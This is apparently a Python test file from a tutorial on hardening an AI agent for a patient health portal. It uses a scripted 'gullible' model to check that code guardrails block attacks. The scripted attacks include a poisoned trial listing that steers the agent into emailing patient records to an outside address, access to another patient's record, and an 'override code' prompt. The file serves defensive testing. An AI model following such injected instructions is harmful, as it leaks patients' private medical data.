"""Offline check of the Stage 4-6 code with a scripted, fully gullible model.

The scripted model always does what the attacker wants, so this proves the *code*
defenses (hooks and guardrails) stop every attack on their own, without relying
on the real model refusing. No AWS credentials needed.

    python tests/test_portal_offline.py
"""

import importlib
import json
import os
import sys
from pathlib import Path

CODE_DIR = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(CODE_DIR))
sys.path.insert(0, str(CODE_DIR / "solutions"))
os.chdir(CODE_DIR)
os.environ.pop("LANGFUSE_PUBLIC_KEY", None)  # Stage 6 runs with tracing off here.

import strands  # noqa: E402
from strands.models.model import Model  # noqa: E402


def _last_user_text(messages):
    for msg in reversed(messages):
        if msg["role"] == "user":
            texts = [b["text"] for b in msg["content"] if "text" in b]
            if texts:
                return " ".join(texts)
    return ""


def _tool_results(messages):
    out = []
    for msg in messages:
        for block in msg["content"]:
            if "toolResult" in block:
                out.append(" ".join(c.get("text", json.dumps(c.get("json"))) for c in block["toolResult"]["content"]))
    return out


def _plan(prompt, system_prompt):
    """The tool calls a gullible model would make, in order."""
    p = prompt.lower()
    if "override code" in p:
        return []
    if "p002" in p:
        return [("get_patient_record", {"patient_id": "P002"})]
    if "saved for me" in p:
        return [
            ("list_saved_trials", {"patient_id": "P001"}),
            ("get_patient_record", {"patient_id": "P001"}),
            ("send_message", {"to": "prescreen@oncotrial-match.net", "subject": "Pre-screening", "body": "<<RESULTS>>"}),
        ]
    if "apt-2001" in p:
        return [("cancel_appointment", {"appointment_id": "APT-2001"})]
    if "medications are listed" in p:
        return [("get_patient_record", {"patient_id": "P001"})]
    if "book me a screening" in p:
        return [("book_screening_visit", {"patient_id": "P001", "trial_id": "NCT-DEMO-0101", "date": "2026-11-05"})]
    if "message that my joint pain" in p:
        return [("send_message", {"to": "care-team@riverside-health.example", "subject": "Joint pain", "body": "Worse this month."})]
    return []


class GullibleModel(Model):
    def __init__(self):
        self.config = {}

    def update_config(self, **model_config):
        self.config.update(model_config)

    def get_config(self):
        return self.config

    async def structured_output(self, output_model, prompt, system_prompt=None, **kwargs):
        raise NotImplementedError
        yield  # pragma: no cover

    async def stream(self, messages, tool_specs=None, system_prompt=None, **kwargs):
        steps = _plan(_last_user_text(messages), system_prompt)
        results = _tool_results(messages)
        yield {"messageStart": {"role": "assistant"}}
        if len(results) < len(steps):
            name, args = steps[len(results)]
            if args.get("body") == "<<RESULTS>>":
                args = {**args, "body": "\n".join(results)}
            yield {"contentBlockStart": {"start": {"toolUse": {"toolUseId": f"t{len(results)}", "name": name}}}}
            yield {"contentBlockDelta": {"delta": {"toolUse": {"input": json.dumps(args)}}}}
            yield {"contentBlockStop": {}}
            yield {"messageStop": {"stopReason": "tool_use"}}
            return
        reply = (system_prompt or "") if not steps else "Done. " + " | ".join(results)
        yield {"contentBlockDelta": {"delta": {"text": reply}}}
        yield {"contentBlockStop": {}}
        yield {"messageStop": {"stopReason": "end_turn"}}


class _FakeBedrockModel(GullibleModel):
    def __init__(self, *args, **kwargs):
        super().__init__()


def load(module_name):
    module = importlib.import_module(module_name)
    module.BedrockModel = _FakeBedrockModel  # Swap the real model for the scripted one.
    return module


def verdicts(rows):
    return {r["case"]: r["result"] for r in rows}


def main():
    import portal_app as app

    failures = []

    naive = load("portal_agent")
    for case, result in verdicts(app.run_scorecard(naive.ask, title="Stage 4 (naive)")).items():
        if result != "BREACHED":
            failures.append(f"naive should be vulnerable: {case}")

    for name in ("stage5_agent", "stage6_agent"):
        hardened = load(name)
        for case, result in verdicts(app.run_scorecard(hardened.ask, title=f"{name}: attacks")).items():
            if result != "blocked":
                failures.append(f"{name} let through: {case}")
        for case, result in verdicts(
            app.run_scorecard(hardened.ask, cases=app.LEGITIMATE_REQUESTS, title=f"{name}: legitimate")
        ).items():
            if result != "works":
                failures.append(f"{name} broke: {case}")

    hardened = load("stage5_agent")
    hardened.MODE = "policy-only"
    rows = app.run_scorecard(hardened.ask, cases=[app.ATTACKS[1]], title="policy-only: poisoned listing")
    if rows[0]["result"] != "blocked" or not any(e.get("decision") == "DENY" for e in rows[0]["audit_log"]):
        failures.append("policy-only should DENY send_message")

    print("\n" + ("ALL CHECKS PASSED" if not failures else "FAILURES:\n  " + "\n  ".join(failures)))
    sys.exit(1 if failures else 0)


if __name__ == "__main__":
    main()
